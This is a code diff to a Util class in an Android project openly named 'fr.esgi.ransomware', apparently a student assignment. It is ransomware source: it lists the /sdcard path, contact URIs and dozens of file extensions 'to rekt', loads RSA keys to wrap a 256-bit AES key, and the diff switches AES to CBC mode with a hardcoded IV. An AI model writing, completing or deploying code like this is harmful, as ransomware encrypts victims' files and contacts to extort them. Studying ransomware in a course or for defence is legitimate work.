@@ -1,14 +1,11 @@
 package fr.esgi.ransomware;
 
-import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Handler;
-import android.os.Message;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
@@ -23,7 +20,6 @@ import java.security.PublicKey;
 import java.security.spec.PKCS8EncodedKeySpec;
 import java.security.spec.X509EncodedKeySpec;
 import java.util.Arrays;
-import java.util.UUID;
 
 import javax.crypto.Cipher;
 
@@ -37,22 +33,19 @@ public class Util {
 
 
     public static final String RSA_ALG = "RSA/ECB/PKCS1Padding";
-    public static final String AES_ALG = "AES/ECB/PKCS5Padding";
+    public static final String AES_ALG = "AES/CBC/PKCS5Padding";
 
-    public static Uri[] URI_TO_REKT = new Uri[] {
+    public static Uri[] URI_TO_REKT = new Uri[]{
             ContactsContract.Contacts.CONTENT_URI,
             ContactsContract.Data.CONTENT_URI
     };
-
-
-
 
 
     public static final String PATH_TO_REKT = "/sdcard";
     public static final String PREFIX_FILE_REKT = "rekt_";
 
     //https://fileinfo.com/filetypes/common
-    public static final String[] EXTENSIONS_TO_REKT = new String[] {
+    public static final String[] EXTENSIONS_TO_REKT = new String[]{
             "3DM", "3DS", "MAX", "OBJ",                                                                                     //3D Image
             "BMP", "DDS", "GIF", "JPG", "PNG", "PSD", "PSPIMAGE", "TGA", "THM", "TIF", "TIFF", "YUV",                       //Image
             "7Z", "CBR", "DEB", "GZ", "PKG", "RAR", "RPM", "SITX", "TAR.GZ", "ZIP", "ZIPX",                                 //Compressed
@@ -63,6 +56,8 @@ public class Util {
     };
 
     public static final int AES_KEY_SIZE = 256;
+
+    public static final String IV = "EVe1qUFKQvZLoffw";
 
     public static PublicKey loadPublicKey(String base64) throws Exception {
         byte[] bytes = Base64.decode(base64, Base64.DEFAULT);
@@ -104,7 +99,7 @@ public class Util {
         String aesEncryptedString = sharedPreferences.getString(SHAREDPREF_AES, null);
         if (aesEncryptedString == null) throw new RuntimeException("NO AES KEY");
 
-        String[] split = aesEncryptedString.substring(1, aesEncryptedString.length()-1).split(", ");
+        String[] split = aesEncryptedString.substring(1, aesEncryptedString.length() - 1).split(", ");
         byte[] aesEncrypted = new byte[split.length];
         for (int i = 0; i < split.length; i++) {
             aesEncrypted[i] = Byte.parseByte(split[i]);
@@ -130,6 +125,7 @@ public class Util {
                 .remove(SHAREDPREF_UUID)
                 .commit();
     }
+
     private static SharedPreferences getSharedPreferences(Context context) {
         return context.getSharedPreferences("APP", Context.MODE_PRIVATE);
     }
